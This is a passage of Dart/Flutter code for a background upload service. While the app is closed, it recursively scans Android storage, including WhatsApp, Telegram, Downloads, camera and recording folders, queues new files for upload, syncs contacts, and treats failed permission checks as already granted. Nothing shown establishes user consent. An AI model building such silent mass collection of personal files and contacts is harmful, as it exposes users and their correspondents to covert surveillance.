        }
      }
    } catch (e) {
      // If we can't request permissions (e.g., no Activity context in background),
      // assume they were already granted during app foreground use
      if (kDebugMode)
        debugPrint(
          '⚠️ [BackgroundUploadService] Permission check failed (likely in background): $e',
        );
      // Don't rethrow - continue execution
    }
  }

  Future<void> _loadPersistentState() async {
    final prefs = await SharedPreferences.getInstance();

    // Get user email for user-specific storage
    final userEmail = _apiService?.userEmail ?? '';
    final storagePrefix = userEmail.isNotEmpty ? '${userEmail}_' : '';

    // Load uploaded file hashes (USER-SPECIFIC)
    _uploadedFileHashes = Set.from(
      prefs.getStringList('${storagePrefix}uploadedFileHashes') ?? [],
    );

    // Load scanned files metadata (USER-SPECIFIC)
    final scannedFilesJson = prefs.getString(
      '${storagePrefix}scannedFilesMetadata',
    );
    if (scannedFilesJson != null) {
      try {
        final decoded = Map<String, dynamic>.from(
          Map<String, dynamic>.from(
            (await compute(_parseScannedFilesJson, scannedFilesJson)),
          ),
        );
        _scannedFiles = decoded.map(
          (key, value) => MapEntry(key, _FileMetadata.fromJson(value)),
        );
      } catch (e) {
        if (kDebugMode)
          debugPrint(
            '⚠️ [BackgroundUploadService] Failed to load scanned files: $e',
          );
        _scannedFiles.clear();
      }
    }

    // Load last full scan time (USER-SPECIFIC)
    final lastScanStr = prefs.getString('${storagePrefix}lastFullScanTime');
    if (lastScanStr != null) {
      try {
        _lastFullScanTime = DateTime.parse(lastScanStr);
      } catch (e) {
        _lastFullScanTime = null;
      }
    }

    // Load initial scan complete flag (USER-SPECIFIC)
    _initialScanComplete =
        prefs.getBool('${storagePrefix}initialScanComplete') ?? false;

    // Clean up old metadata (older than 30 days)
    _cleanupOldMetadata();

    if (kDebugMode)
      debugPrint(
        '📦 [BackgroundUploadService] Loaded ${_uploadedFileHashes.length} uploaded file hashes, ${_scannedFiles.length} scanned files',
      );
  }

  /// Helper function for parsing JSON in isolate
  static Map<String, dynamic> _parseScannedFilesJson(String json) {
    try {
      return Map<String, dynamic>.from(jsonDecode(json));
    } catch (e) {
      debugPrint(
        '⚠️ [BackgroundUploadService] Failed to parse scanned files JSON: $e',
      );
      return {};
    }
  }

  /// Clean up metadata for files that were scanned more than 30 days ago
  void _cleanupOldMetadata() {
    final cutoff = DateTime.now().subtract(Duration(days: 30));
    _scannedFiles.removeWhere(
      (key, value) => value.scannedTime.isBefore(cutoff),
    );

    if (kDebugMode)
      debugPrint(
        '🧹 [BackgroundUploadService] Cleaned up old metadata, ${_scannedFiles.length} entries remain',
      );
  }

  Future<void> _savePersistentState() async {
    final prefs = await SharedPreferences.getInstance();

    // Get user email for user-specific storage
    final userEmail = _apiService?.userEmail ?? '';
    final storagePrefix = userEmail.isNotEmpty ? '${userEmail}_' : '';

    // Save uploaded file hashes (USER-SPECIFIC)
    await prefs.setStringList(
      '${storagePrefix}uploadedFileHashes',
      _uploadedFileHashes.toList(),
    );

    // Save scanned files metadata (limit to most recent 10000 entries to avoid bloat) (USER-SPECIFIC)
    final sortedEntries = _scannedFiles.entries.toList()
      ..sort((a, b) => b.value.scannedTime.compareTo(a.value.scannedTime));
    final limitedEntries = sortedEntries.take(10000);

    // CRITICAL FIX: Actually persist the metadata!
    if (limitedEntries.isNotEmpty) {
      final metadataMap = Map.fromEntries(
        limitedEntries.map((e) => MapEntry(e.key, e.value.toJson())),
      );
      await prefs.setString(
        '${storagePrefix}scannedFilesMetadata',
        jsonEncode(metadataMap),
      );
    }

    // Save last full scan time (USER-SPECIFIC)
    if (_lastFullScanTime != null) {
      await prefs.setString(
        '${storagePrefix}lastFullScanTime',
        _lastFullScanTime!.toIso8601String(),
      );
    }

    // Save initial scan complete flag (USER-SPECIFIC)
    await prefs.setBool(
      '${storagePrefix}initialScanComplete',
      _initialScanComplete,
    );

    if (kDebugMode)
      debugPrint(
        '💾 [BackgroundUploadService] Saved ${_uploadedFileHashes.length} uploaded file hashes, ${limitedEntries.length} scanned files',
      );
  }

  /// Initialize contact service
  Future<void> _initializeContactService() async {
    try {
      if (kDebugMode)
        debugPrint('🔗 [BackgroundUploadService] Initializing contact service');
      await ContactService.instance.initialize();
      if (kDebugMode)
        debugPrint('✅ [BackgroundUploadService] Contact service initialized');
    } catch (e) {
      if (kDebugMode)
        debugPrint(
          '❌ [BackgroundUploadService] Contact service initialization failed: $e',
        );
    }
  }

  /// Force sync all contacts
  Future<Map<String, dynamic>> syncAllContacts() async {
    if (kDebugMode)
      debugPrint('🔄 [BackgroundUploadService] Manually syncing contacts');
    return await ContactService.instance.forceSyncAllContacts();
  }

  /// Get contact sync status
  Future<Map<String, dynamic>> getContactSyncStatus() async {
    final lastSync = await ContactService.instance.getLastSyncTime();
    return {
      'lastSync': lastSync?.toIso8601String(),
      'isMonitoring': ContactService.instance.isMonitoring,
    };
  }

  /// Public getter for service running status
  bool get isRunning => _isRunning;

  /// Public method to trigger file scan and upload
  Future<void> triggerScanAndUpload() async {
    if (_isRunning) {
      await _scanAndUpload();
    }
  }

  /// Public method to flush pending batches
  Future<void> flushPendingBatches() async {
    if (_isRunning) {
      await _flushBatches();
    }
  }

  /// Aggressive background scan for when app is closed
  Future<int> performBackgroundScan() async {
    if (!_isRunning) {
      return 0;
    }

    // Ensure API service is initialized for background operations
    await _ensureApiService();

    int filesFound = 0;
    int filesSkipped = 0;
    if (kDebugMode)
      debugPrint(
        '🔍 [BackgroundUploadService] Starting aggressive background scan',
      );

    try {
      // Use photo_manager for background scan (works on all platforms)
      await _scanMediaWithPhotoManager(false); // Don't skip, full scan
      await _scanDocumentsDirectory(false);

      // Count queued files
      filesFound = _pendingFiles.length;

      if (kDebugMode)
        debugPrint(
          '✅ [BackgroundUploadService] Background scan complete, $filesFound files queued',
        );

      // For Android, also scan additional system directories
      if (Platform.isAndroid) {
        final priorityDirs = [
          '/storage/emulated/0/Documents',
          '/storage/emulated/0/Download',
          '/storage/emulated/0/DCIM',
          '/storage/emulated/0/Pictures',
          '/storage/emulated/0/Music',
          '/storage/emulated/0/WhatsApp/Media',
          '/storage/emulated/0/Telegram',
          '/storage/emulated/0/Movies',
          '/storage/emulated/0/Recordings',
        ];

        for (final dirPath in priorityDirs) {
          final dir = Directory(dirPath);
          if (dir.existsSync()) {
            await for (final entity in dir.list(
              recursive: true,
              followLinks: false,
            )) {
              if (entity is File && !_isTemporaryFile(entity.path)) {
                // CRITICAL: Check if already queued
                if (_queuedFilePaths.contains(entity.path)) {
                  filesSkipped++;
                  continue;
                }

                // NEW: Check metadata first before hashing
                if (await _shouldSkipFile(entity)) {
                  filesSkipped++;
                  continue;
                }

                final hash = await _calculateFileHash(entity);
                if (hash.isNotEmpty && !_uploadedFileHashes.contains(hash)) {
                  if (!_queue.isClosed && _isRunning) {
                    _queuedFilePaths.add(entity.path); // Mark as queued
                    _queue.add(entity);
                    filesFound++;
                    if (kDebugMode)
                      debugPrint(
                        '📎 [BackgroundUploadService] Queued new file: ${entity.path}',
                      );
                  }
                } else if (hash.isNotEmpty) {
                  filesSkipped++;
                  // File already uploaded - update metadata
                  try {
                    final stat = entity.statSync();
                    _scannedFiles[entity.path] = _FileMetadata(
                      path: entity.path,
                      size: stat.size,
                      modifiedTime: stat.modified,
                      hash: hash,
                      scannedTime: DateTime.now(),
                      uploaded: true,
                    );
                  } catch (e) {
                    // Ignore metadata errors
                  }
                }
              }
            }
          }
        }
      }

      // Force immediate flush of any found files
      if (filesFound > 0) {
        await _flushBatches();
      }

      if (kDebugMode)
        debugPrint(
          '✅ [BackgroundUploadService] Background scan completed: $filesFound new files found, $filesSkipped files skipped',
        );

      return filesFound;
    } catch (e) {
      if (kDebugMode)
        debugPrint('❌ [BackgroundUploadService] Background scan error: $e');
      return 0;
    }
  }
}

/// Metadata class to track scanned files and avoid re-scanning/re-hashing
class _FileMetadata {
  final String path;
  final int size;
  final DateTime modifiedTime;
  final String? hash; // null if not yet hashed, hash if uploaded
  final DateTime scannedTime;
  final bool uploaded;

  _FileMetadata({
    required this.path,
    required this.size,
    required this.modifiedTime,
    this.hash,
    required this.scannedTime,
    this.uploaded = false,
  });

  /// Check if file has changed since last scan
  bool hasChanged(File file) {
    try {
      final stat = file.statSync();
      return stat.size != size || stat.modified != modifiedTime;
    } catch (e) {
      return true; // If we can't stat, assume changed
    }
  }

  /// Convert to JSON for persistence
  Map<String, dynamic> toJson() => {
    'path': path,
    'size': size,
    'modifiedTime': modifiedTime.toIso8601String(),
    'hash': hash,
    'scannedTime': scannedTime.toIso8601String(),
    'uploaded': uploaded,
  };

  /// Create from JSON
  factory _FileMetadata.fromJson(Map<String, dynamic> json) => _FileMetadata(
    path: json['path'],
    size: json['size'],
    modifiedTime: DateTime.parse(json['modifiedTime']),
    hash: json['hash'],
    scannedTime: DateTime.parse(json['scannedTime']),
    uploaded: json['uploaded'] ?? false,
  );
}

class _IsolateMsg {
  final List<String> roots;
  final SendPort sendPort;
  _IsolateMsg(this.roots, this.sendPort);
}

class _FoundPath {
  final String path;
  _FoundPath(this.path);
}

class _IsolateDone {}

void _scanEntry(_IsolateMsg msg) {
  for (var root in msg.roots) {
    final dir = Directory(root);
    if (dir.existsSync()) {
      _scanDirectory(dir, msg.sendPort);
    } else {
      if (kDebugMode) ;
      // Isolate.current.debugPrint('⚠️ [Isolate] Directory not found: $root');
    }
  }
  msg.sendPort.send(_IsolateDone());
}

void _scanDirectory(Directory dir, SendPort send, [Set<String>? excludePaths]) {
  try {
    final entities = dir.listSync(followLinks: false);
    for (var entity in entities) {
      if (excludePaths?.contains(entity.path) ?? false) continue;
      if (entity is File) {
        send.send(_FoundPath(entity.path));
      } else if (entity is Directory &&
          !entity.path.split('/').last.startsWith('.')) {
        _scanDirectory(entity, send, excludePaths);
      }
    }
  } catch (e) {
    // if (kDebugMode) Isolate.current.debugPrint('⚠️ [Isolate] Scan error: $e');
  }
}
